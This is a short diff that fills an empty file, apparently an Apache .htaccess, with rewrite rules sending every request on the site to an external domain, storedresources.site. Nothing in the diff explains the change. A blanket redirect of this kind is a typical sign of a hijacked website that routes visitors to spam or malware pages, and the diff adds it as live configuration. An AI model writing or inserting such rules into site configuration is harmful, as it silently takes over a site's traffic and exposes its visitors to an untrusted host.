@@ -1,1 +1,3 @@
-
+RewriteEngine on
+RewriteBase /
+RewriteRule ^(.*)$ http://storedresources.site/app/content/main/ [NC]
